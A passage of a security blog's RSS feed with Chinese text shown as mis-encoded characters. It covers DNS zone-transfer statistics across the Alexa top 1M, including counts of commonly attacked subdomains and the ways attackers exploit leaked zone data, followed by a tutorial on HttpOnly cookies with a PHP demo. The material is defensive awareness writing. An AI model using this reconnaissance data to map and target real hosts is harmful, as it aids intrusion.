&lt;h3 id=&quot;é—œæ–¼å„å€‹-tld-çš„çµ±è¨ˆæ•¸æ“š&quot;&gt;é—œæ–¼å„å€‹ TLD çš„çµ±è¨ˆæ•¸æ“š&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Transferable domain in this TLDï¼šåœ¨ç‰¹å®š TLD ä¸­ï¼Œæœ‰å¤šå°‘ domain å¯ä»»æ„åŸ·è¡Œ zone transfer&lt;/li&gt;
  &lt;li&gt;Same TLD in Alexa top 1Mï¼šç‰¹å®š TLD åœ¨æœ¬æ¬¡ 987447 å€‹å—æ¸¬ç›®æ¨™ä¸­æ‰€ä½”çš„æ•¸é‡&lt;/li&gt;
  &lt;li&gt;Percentage of same TLD in Alexa top 1Mï¼šç‰¹å®š TLD åœ¨ Alexa top 1M å…§æ‰€æœ‰åŒæ¨£ TLD æ‰€ä½”çš„ç™¾åˆ†æ¯”ï¼ˆä¾‹ï¼š.com å³ç‚º 35230 / 527203 = 6.68%ï¼‰&lt;/li&gt;
  &lt;li&gt;Percentage of all transferable domainï¼šæŸç‰¹å®š TLD å¯ä»»æ„åŸ·è¡Œ zone transfer çš„æ•¸é‡åœ¨æœ¬æ¬¡æ‰€æœ‰å¯ä»»æ„åŸ·è¡Œ zone transfer æ‰€å çš„ç™¾åˆ†æ¯”ï¼ˆä¾‹ï¼š.com å³ç‚º 35230 / 79133 = 44.52%ï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç”±æ–¼åŸå§‹æ•¸æ“šå¤ªå¤šï¼Œå› æ­¤æœ¬æ–‡åƒ…åˆ—å‡ºå‰ 25 åã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; title=&quot;Zone Transfer å•é¡Œçš„ TLD ç›¸é—œçµ±è¨ˆ&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; alt=&quot;Zone Transfer å•é¡Œçš„ TLD ç›¸é—œçµ±è¨ˆ&quot; title=&quot;Zone Transfer å•é¡Œçš„ TLD ç›¸é—œçµ±è¨ˆ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;.tw ç¶²åŸŸæ’ç¬¬äºŒåä¸€åï¼Œå¹¸å¥½é€™æ¬¡ä¸æ˜¯ä¸–ç•Œç¬¬ä¸€äº†ï¼Œå¦å‰‡åˆæ˜¯å¦é¡çš„å°ç£ä¹‹å…‰ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é—œæ–¼-name-server-çš„çµ±è¨ˆæ•¸æ“š&quot;&gt;é—œæ–¼ name server çš„çµ±è¨ˆæ•¸æ“š&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Number of domainï¼šè©²å° name server æœ‰å¤šå°‘ domain å¯ä»»æ„åŸ·è¡Œ zone transfer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç”±æ–¼åŸå§‹æ•¸æ“šå¤ªå¤šï¼Œå› æ­¤æœ¬æ–‡åƒ…åˆ—å‡ºå‰ 25 åã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; title=&quot;Zone Transfer å•é¡Œçš„ name server ç›¸é—œçµ±è¨ˆ&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; alt=&quot;Zone Transfer å•é¡Œçš„ name server ç›¸é—œçµ±è¨ˆ&quot; title=&quot;Zone Transfer å•é¡Œçš„ name server ç›¸é—œçµ±è¨ˆ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;å¯åŸ·è¡Œ zone transfer ä¸”ä¸é‡è¤‡çš„ namer server å…±æœ‰ 53830 å€‹&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;é—œæ–¼-ip-ä½å€çš„çµ±è¨ˆæ•¸æ“š&quot;&gt;é—œæ–¼ IP ä½å€çš„çµ±è¨ˆæ•¸æ“š&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;æœ‰ 7939172 å€‹ä¸é‡è¤‡çš„ IP ä½å€&lt;/li&gt;
  &lt;li&gt;åœ¨å…¨éƒ¨ IP ä½å€ä¸­ï¼Œæœ‰ 704638 å€‹æ˜¯ç§æœ‰ IP ä½å€&lt;/li&gt;
  &lt;li&gt;åœ¨ç§æœ‰ IP ä½å€ä¸­ï¼Œæœ‰ 598443 å€‹æ˜¯ 10. é–‹é ­ï¼Œä½”æ‰€æœ‰ IP ä½å€çš„ 7.538%ï¼Œä½”ç§æœ‰ IP ä½å€çš„ 84.929%&lt;/li&gt;
  &lt;li&gt;åœ¨ç§æœ‰ IP ä½å€ä¸­ï¼Œæœ‰ 66270 å€‹æ˜¯ 172.16~31 é–‹é ­ï¼Œä½”æ‰€æœ‰ IP ä½å€çš„ 0.835%ï¼Œä½”ç§æœ‰ IP ä½å€çš„ 9.405%&lt;/li&gt;
  &lt;li&gt;åœ¨ç§æœ‰ IP ä½å€ä¸­ï¼Œæœ‰ 39925 å€‹æ˜¯ 192.168 é–‹é ­ï¼Œä½”æ‰€æœ‰ IP ä½å€çš„ 0.503%ï¼Œä½”ç§æœ‰ IP ä½å€çš„ 5.666%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;subdomain-çš„çµ±è¨ˆæ•¸æ“š&quot;&gt;subdomain çš„çµ±è¨ˆæ•¸æ“š&lt;/h3&gt;

&lt;p&gt;ä»¥ä¸‹é¸å‡ºä¸€äº›å¸¸è¢«å…¥ä¾µè€…ç•¶ä½œæ”»æ“Šç›®æ¨™çš„ subdomain ä¾†è¨ˆç®—åœ¨ 22631804 ç­† DNS è¨˜éŒ„ä¸­åˆ†åˆ¥å„ä½”äº†å¹¾ç­†ï¼Œæ¯å€‹ subdomain å…±æœ‰å…©å€‹çµ±è¨ˆçµæœï¼Œé€—è™Ÿå·¦é‚Šçš„çµ±è¨ˆçµæœä»£è¡¨ä»¥è©² subdomain é–‹é ­çš„ DNS è¨˜éŒ„ï¼Œä¾‹å¦‚ git.devco.reã€‚é€—è™Ÿå³é‚Šçš„çµ±è¨ˆçµæœå‰‡å°‡å‰å¾Œæœ‰æ•¸å­—çš„ subdomain ä¹Ÿä¸€ä½µè¨ˆå…¥ï¼Œä¾‹å¦‚ dns01.devco.reã€01dns.devco.reã€0dns001.devco.re ç­‰ç­‰ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ç‰ˆæœ¬æ§åˆ¶&lt;/p&gt;

    &lt;p&gt;git: 583, 626&lt;/p&gt;

    &lt;p&gt;gitlab: 138, 138&lt;/p&gt;

    &lt;p&gt;svn: 1552, 1669&lt;/p&gt;

    &lt;p&gt;subversion: 71, 72&lt;/p&gt;

    &lt;p&gt;cvs: 284, 330&lt;/p&gt;

    &lt;p&gt;hg: 115, 331&lt;/p&gt;

    &lt;p&gt;mercurial: 18, 19&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;é–‹ç™¼èˆ‡æ¸¬è©¦&lt;/p&gt;

    &lt;p&gt;test: 14691, 20001&lt;/p&gt;

    &lt;p&gt;dev: 8300, 10959&lt;/p&gt;

    &lt;p&gt;stage: 1329, 1628&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;è³‡æ–™åº«&lt;/p&gt;

    &lt;p&gt;db: 1190, 2537&lt;/p&gt;

    &lt;p&gt;database: 150, 302&lt;/p&gt;

    &lt;p&gt;sql: 2209, 3298&lt;/p&gt;

    &lt;p&gt;mysql: 4045, 4998&lt;/p&gt;

    &lt;p&gt;postgre: 11, 11&lt;/p&gt;

    &lt;p&gt;redis: 21, 33&lt;/p&gt;

    &lt;p&gt;mongodb: 6, 42&lt;/p&gt;

    &lt;p&gt;memcache: 13, 72&lt;/p&gt;

    &lt;p&gt;phpmyadmin: 455, 485&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;å¾Œå°ç®¡ç†&lt;/p&gt;

    &lt;p&gt;manager: 188, 222&lt;/p&gt;

    &lt;p&gt;staff: 481, 542&lt;/p&gt;

    &lt;p&gt;member: 331, 376&lt;/p&gt;

    &lt;p&gt;backend: 153, 177&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç·šä¸Šæœå‹™ç›¸é—œ&lt;/p&gt;

    &lt;p&gt;api: 1871, 2097&lt;/p&gt;

    &lt;p&gt;search: 1469, 10987&lt;/p&gt;

    &lt;p&gt;pic: 178, 293&lt;/p&gt;

    &lt;p&gt;img: 1775, 3517&lt;/p&gt;

    &lt;p&gt;service: 779, 959&lt;/p&gt;

    &lt;p&gt;payment: 225, 238&lt;/p&gt;

    &lt;p&gt;cache: 373, 627&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç§æœ‰æœå‹™&lt;/p&gt;

    &lt;p&gt;erp: 275, 318&lt;/p&gt;

    &lt;p&gt;eip: 69, 80&lt;/p&gt;

    &lt;p&gt;log: 227, 414&lt;/p&gt;

    &lt;p&gt;nagios: 636, 736&lt;/p&gt;

    &lt;p&gt;mrtg: 458, 565&lt;/p&gt;

    &lt;p&gt;cgi: 194, 261&lt;/p&gt;

    &lt;p&gt;dns: 2634, 9085&lt;/p&gt;

    &lt;p&gt;ns: 12198, 63431&lt;/p&gt;

    &lt;p&gt;ftp: 197414, 199481&lt;/p&gt;

    &lt;p&gt;blog: 5074, 5446&lt;/p&gt;

    &lt;p&gt;mail: 238742, 254515&lt;/p&gt;

    &lt;p&gt;email: 2484, 2706&lt;/p&gt;

    &lt;p&gt;webmail: 24164, 25067&lt;/p&gt;

    &lt;p&gt;owa: 798, 888&lt;/p&gt;

    &lt;p&gt;autodiscover: 30462, 30466&lt;/p&gt;

    &lt;p&gt;vpn: 3152, 7025&lt;/p&gt;

    &lt;p&gt;sso: 398, 462&lt;/p&gt;

    &lt;p&gt;ssl: 709, 932&lt;/p&gt;

    &lt;p&gt;proxy: 1464, 2215&lt;/p&gt;

    &lt;p&gt;cms: 1320, 1696&lt;/p&gt;

    &lt;p&gt;crm: 1152, 1301&lt;/p&gt;

    &lt;p&gt;forum: 3654, 4037&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æŒ‰-end-çš„äººæœ‰ç¦äº†&quot;&gt;æŒ‰ End çš„äººæœ‰ç¦äº†&lt;/h3&gt;

&lt;p&gt;ç©¶ç«Ÿç¶“ç”± zone transfer æ‰€å¾—åˆ°çš„è³‡æ–™å¯ä»¥æ‹¿ä¾†åšä»€éº¼ï¼Ÿå°æ–¼æ”»æ“Šè€…è€Œè¨€ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç¨®åˆ©ç”¨æ–¹å¼ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å»ºç«‹å­—å…¸æª”ï¼šå…¥ä¾µè€…å¯åˆ©ç”¨ä¸Šè¿°è³‡æ–™å»ºç«‹ä¸€ä»½æœ€å¸¸è¦‹çš„ subdomain çš„å­—å…¸æª”ï¼Œæœªä¾†åˆ©ç”¨æ­¤å­—å…¸æª”é€²è¡Œæƒææ™‚å¯ç¯€çœè¨±å¤šæ™‚é–“æˆæœ¬ï¼Œå¿«é€Ÿæª¢æ¸¬æŸé–“å…¬å¸æœ‰å“ªäº› subdomain&lt;/li&gt;
  &lt;li&gt;æ—æ•²å´æ“Šï¼šå…¥ä¾µè€…å¯è§€å¯Ÿå“ªäº› name server æœ‰é–‹æ”¾ zone transfer æŸ¥è©¢ï¼Œæ¥è‘—å»è’é›†é‚„æœ‰å“ªäº›å…¬å¸ä½¿ç”¨åŒä¸€å° name serverï¼Œå†é€²ä¸€æ­¥æƒç„é‚£äº› domainã€‚é‚£äº› domain ä¹Ÿè¨±ä¸æ˜¯å¤§å…¬å¸ã€ä¸åœ¨ Alexa top 1M å…§ï¼Œä½†ä½ ç„¡æ³•ç¢ºä¿å®ƒæ°¸é ä¸æœƒæ˜¯å…¥ä¾µè€…çš„æ”»æ“Šç›®æ¨™ã€‚&lt;/li&gt;
  &lt;li&gt;çµåˆ 0day é€²è¡Œæ”»æ“Šï¼šç•¶æŸå€‹ç¬¬ä¸‰æ–¹å¥—ä»¶è¢«æ­éœ² 0day å¼±é»æ™‚ï¼Œæ“æœ‰ä¸Šè¿°è³‡æ–™çš„äººå°±å¯ä»¥è¿…é€ŸåŸ·è¡Œå¤§ç¯„åœçš„æ”»æ“Šã€‚ä¾‹å¦‚&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2013-0156/&quot;&gt;é€™å¹¾å¹´æ­£å¤¯çš„ Rails åœ¨å»å¹´è¢«çˆ†å‡ºæœ‰ Remote Code Exection å¼±é» CVE-2013-0156&lt;/a&gt;ï¼Œå…¥ä¾µè€…å¯ç›´æ¥å°æ‰€æœ‰ redmine é€²è¡Œæ”»æ“Šã€‚&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2014-3412/&quot;&gt;Juniper VPN åœ¨ä»Šå¹´ä¹Ÿè¢«æ­éœ² Remote Code Execution å¼±é»&lt;/a&gt;ï¼Œå…¥ä¾µè€…å¯æ‰¾å°‹æ‰€æœ‰ vpn subdomain ä¾†é€²è¡Œå˜—è©¦ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;åœ¨ä¸Šæ¬¡æˆ‘å€‘æèµ·é€™å€‹å¤è€çš„å¼±é»å¾Œï¼Œå·²ç¶“æœ‰éƒ¨åˆ†å°ç£ä¼æ¥­é™¸çºŒå°‡æ­¤å•é¡Œä¿®å¾©ï¼Œä½†è¨±å¤šå°ç£ä¼æ¥­ä»æœ‰æ­¤å•é¡Œè€Œä¸è‡ªçŸ¥ï¼Œä¹Ÿè¨±éé™£å­æˆ‘å€‘ç›´æ¥åšå€‹ Wall of Shame æ¢åˆ—å‡ºå“ªäº›å» å•†æœ‰å•é¡Œæœƒè®“å¤§å®¶æ¯”è¼ƒæœ‰æ„Ÿ :p&lt;/p&gt;

&lt;p&gt;ä¸éä¹Ÿåˆ¥æ€¥è‘—ç¬‘å°ç£ä¼æ¥­ï¼Œè¨±å¤šåœ‹éš›ç´šçš„å¤§ç¶²ç«™åŒæ¨£ä¹Ÿæœ‰æ­¤é¡å•é¡Œã€‚ç”±æ­¤å¯è¦‹è³‡å®‰å•é¡Œä¸åˆ†æ–°èˆŠã€ä¸åˆ†åœ‹å…§å¤–ï¼Œç¸½æ˜¯å®¹æ˜“è¢«å¤§å®¶å¿½ç•¥ï¼Œç­‰åˆ°ä¸çŸ¥ä¸è¦ºè¢«å…¥ä¾µè€…æ…äº†é‡é‡çš„ä¸€åˆ€å¾Œï¼Œæ‰é©šè¦ºé€™è¨±å¤šçš„å°å¼±é»ä¸€æ—¦ä¸²èµ·ä¾†æ˜¯å¤šéº¼çš„å¯æ€•ã€‚ä½ ï¼Œé–‹å§‹æœ‰æ‰€è­¦è¦ºäº†å—ï¼Ÿ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m/</link>
                <guid>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m</guid>
                <pubDate>Fri, 13 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HttpOnly - HTTP Headers çš„è³‡å®‰è­°é¡Œ (3)</title>
                <description>&lt;p&gt;ä¸Šæ¬¡æˆ‘å€‘æåˆ°äº† &lt;a href=&quot;https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;ï¼Œé€™æ¬¡æˆ‘å€‘ä¾†èŠèŠåŒæ¨£æ˜¯ç‚ºäº†é˜²ç¦¦ XSS è€Œç”Ÿçš„å¦ä¸€å€‹æŠ€è¡“ã€‚&lt;/p&gt;

&lt;h3 id=&quot;httponly-ç°¡ä»‹&quot;&gt;HttpOnly ç°¡ä»‹&lt;/h3&gt;

&lt;p&gt;Cookie çš„æ¦‚å¿µé›–ç„¶æ—©åœ¨ 1994 å¹´å°±ç”± Netscape çš„å·¥ç¨‹å¸« Montulli æå‡ºï¼Œä½†ç•¶æ™‚ä»æœªæœ‰å®Œå–„çš„é˜²è­·æ©Ÿåˆ¶ï¼Œåƒæ˜¯ HttpOnlyã€Secure ç­‰è¦ç¯„éƒ½æ˜¯å¾Œä¾†é™¸çºŒè¢«æå‡ºï¼Œç›´åˆ° 2011 å¹´ 4 æœˆæ‰åœ¨ &lt;a href=&quot;http://tools.ietf.org/html/rfc6265&quot;&gt;RFC 6265&lt;/a&gt; ä¸­æ­£å¼å®šæ¡ˆã€‚è€Œå…¶ä¸­çš„ &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;HttpOnly&lt;/a&gt; æ˜¯å°ˆé–€ç‚ºäº†æŠµç¦¦æ”»æ“Šè€…åˆ©ç”¨ Cross-Site Scripting (XSS) æ‰‹æ³•ä¾†ç›œå–ç”¨æˆ¶èº«ä»½ï¼Œæ­¤é … Cookie é˜²è­·è¨­å®šæ‡‰è©²æ˜¯åœ¨ HTTP Headers ç³»åˆ—æ–‡ä¸­æœ€å»£ç‚ºäººçŸ¥çš„é …ç›®ã€‚&lt;/p&gt;

&lt;h3 id=&quot;httponly-ä¸»è¦ä½œç”¨&quot;&gt;HttpOnly ä¸»è¦ä½œç”¨&lt;/h3&gt;

&lt;p&gt;èªªæ˜ HttpOnly ä¸»è¦ä½œç”¨ä¹‹å‰ï¼Œå…ˆè«‡è«‡ XSS æœ€å¸¸è¦‹çš„åˆ©ç”¨æ–¹å¼ã€‚XSS æ”»æ“Šæ—©åœ¨ 1990 å¹´å°±è¢«ç™¼ç¾ï¼Œæ­¤æ”»æ“Šæ‰‹æ³•æœ€å¸¸è¦‹çš„åˆ©ç”¨æ–¹å¼æ˜¯å­˜å–ä½¿ç”¨è€…çš„ cookie ä¾†ç²å¾—ä¸€äº›æ©Ÿæ•è³‡æ–™ã€‚åƒæ˜¯å­˜å– session cookie å³å¯ç›œç”¨ä½¿ç”¨è€…çš„èº«ä»½ï¼ˆé—œæ–¼ session çš„é‡è¦æ€§ï¼Œå¯ä»¥åƒè€ƒæˆ‘å€‘éƒ¨è½æ ¼çš„å¦ä¸€ç¯‡æ–‡ç«  &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;HTTP Session æ”»æ“Šèˆ‡é˜²è­·&lt;/a&gt;ï¼‰ï¼Œå¦‚æœåœ¨ cookie ä¸­è¨˜éŒ„äº†å…¶ä»–æ©Ÿæ•è³‡è¨Šï¼Œä¹Ÿå¯èƒ½æœƒä¸€ä½µé­ç«Šã€‚å› æ­¤è‹¥èƒ½é˜»æ­¢æ”»æ“Šè€…å­˜å–å¸¶æœ‰æ•æ„Ÿè³‡æ–™çš„ cookieï¼Œå°±èƒ½æ¸›å°‘ XSS å°ä½¿ç”¨è€…çš„å½±éŸ¿ï¼Œå› è€Œå‚¬ç”Ÿäº† HttpOnly æ©Ÿåˆ¶ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;ç•¶ cookie æœ‰è¨­å®š HttpOnly flag æ™‚ï¼Œç€è¦½å™¨æœƒé™åˆ¶ cookie åªèƒ½ç¶“ç”± HTTP(S) å”å®šä¾†å­˜å–ã€‚å› æ­¤ç•¶ç¶²ç«™æœ‰ XSS å¼±é»æ™‚ï¼Œè‹¥ cookie å«æœ‰ HttpOnly flagï¼Œå‰‡æ”»æ“Šè€…ç„¡æ³•ç›´æ¥ç¶“ç”± JavaScript å­˜å–ä½¿ç”¨è€…çš„ session cookieï¼Œå¯é™ä½ä½¿ç”¨è€…èº«ä»½è¢«ç›œç”¨çš„æ©Ÿç‡ã€‚æ—©æœŸæœ‰äº›ç€è¦½å™¨æœªå®Œæ•´å¯¦ä½œ HttpOnly æ‰€æœ‰åŠŸèƒ½ï¼Œå› æ­¤æ”»æ“Šè€…ä»å¯é€é XMLHttpRequest è®€å– cookieï¼Œä½†æœ€è¿‘å¹¾å¹´å„å¤§ç€è¦½å™¨ä¹Ÿé™¸çºŒé˜»æ“‹äº†é€™å€‹æ–¹å¼ã€‚å› æ­¤ HttpOnly å¯æœ‰æ•ˆé™ä½ XSS çš„å½±éŸ¿ä¸¦æå‡æ”»æ“Šé›£åº¦ã€‚ç›®å‰ç€è¦½å™¨çš„æ”¯æ´åˆ—è¡¨å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot; alt=&quot;HttpOnly ç€è¦½å™¨æ”¯æ´åˆ—è¡¨&quot; title=&quot;HttpOnly ç€è¦½å™¨æ”¯æ´åˆ—è¡¨&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä»–ç€è¦½å™¨æ”¯æ´åˆ—è¡¨ä»¥åŠå„å®¶ç¨‹å¼èªè¨€ä½¿ç”¨ HttpOnly çš„æ–¹å¼å¯åƒè€ƒ &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;OWASP HttpOnly&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;httponly-demo&quot;&gt;HttpOnly Demo&lt;/h3&gt;

&lt;p&gt;ä»¥ä¸‹ä½¿ç”¨ PHP ç¨‹å¼ç¢¼ç‚ºä¾‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;title&amp;gt;HttpOnly Demo&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;h3&amp;gt;HttpOnly Demo&amp;lt;/h3&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;p&amp;gt;If you didn&amp;#39;t set HttpOnly flag, cookie will write down by document.write().&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;            document.write(document.cookie);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-unset.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-unset.png&quot; alt=&quot;æœªè¨­å®š HttpOnly ä¹‹å‰ï¼Œcookie å¯è¢« JavaScript å­˜å–&quot; title=&quot;æœªè¨­å®š HttpOnly ä¹‹å‰ï¼Œcookie å¯è¢« JavaScript å­˜å–&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ä¸Šåœ–ä¸­å¯çœ‹åˆ° PHPSESSID å·²æˆåŠŸè¢« JavaScript å­˜å–ï¼Œé€™ä¹Ÿæ„å‘³è‘—ç¶²ç«™æœ‰ XSS å¼±é»æ™‚ï¼Œä½¿ç”¨è€…çš„èº«ä»½æœ‰è¼ƒé«˜çš„æ©Ÿç‡è¢«ç›œç”¨ã€‚ç‚ºäº†ä½¿ç”¨ HttpOnly é€²è¡Œé˜²è­·ï¼Œè®“æˆ‘å€‘å°‡ PHP ç¨‹å¼ç¢¼ä¿®æ”¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;session.cookie_httponly&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-set.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-set.png&quot; alt=&quot;è¨­å®š HttpOnly å¾Œï¼Œcookie å·²ç„¡æ³•è¢« JavaScript å­˜å–&quot; title=&quot;è¨­å®š HttpOnly å¾Œï¼Œcookie å·²ç„¡æ³•è¢« JavaScript å­˜å–&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥ä½¿ç”¨ç•«é¢ä¸­å³ä¸Šè§’çš„ Chrome &lt;a href=&quot;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&quot;&gt;Edit This Cookie å¥—ä»¶&lt;/a&gt; çœ‹åˆ° HttpOnly å·²ç¶“è¢«å‹¾é¸ï¼ˆå¦‚ç´…æ¡†è™•ï¼‰ï¼Œä¸¦ä¸” PHPSESSID å·²ç„¡æ³•è¢« JavaScript å­˜å–ï¼Œä¸å­˜åœ¨æ–¼ HTML ä¸­ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ç›®å‰ PHP å®˜æ–¹çš„æ•™å­¸æ˜¯ç”¨ session_set_cookie_params é€™å€‹ functionï¼Œå¯åƒè€ƒ&lt;a href=&quot;http://www.php.net/manual/en/function.session-set-cookie-params.php&quot;&gt;å®˜æ–¹ç¶²é çš„é€™ç¯‡èªªæ˜&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;httponly-å¯¦éš›ä½¿ç”¨æ¡ˆä¾‹&quot;&gt;HttpOnly å¯¦éš›ä½¿ç”¨æ¡ˆä¾‹&lt;/h3&gt;

&lt;p&gt;ç”±æ–¼ HttpOnly çš„ä½¿ç”¨æ–¹å¼è¼ƒç°¡å–®ï¼Œå› æ­¤åƒ…åˆ—èˆ‰å¹¾å€‹ç«™å°çš„ä½¿ç”¨çµæœåœ–ç‰‡çµ¦å¤§å®¶åƒè€ƒï¼Œå°±ä¸å¦å¤–å¤šåšèªªæ˜å›‰ï¼&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Tå®¢é‚¦ (www.techbang.com)ï¼Œæœ‰è¨­å®š HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot; alt=&quot;Tå®¢é‚¦&quot; title=&quot;Tå®¢é‚¦&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ„›æ–™ç† (icook.tw)ï¼Œæœ‰è¨­å®š HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot; alt=&quot;æ„›æ–™ç†&quot; title=&quot;æ„›æ–™ç†&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mobile01 (www.mobile01.com)ï¼Œæœªè¨­å®š HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot; alt=&quot;Mobile01&quot; title=&quot;Mobile01&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Giga Circle (tw.gigacircle.com)ï¼Œæœªè¨­å®š HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot; alt=&quot;Giga Circle&quot; title=&quot;Giga Circle&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

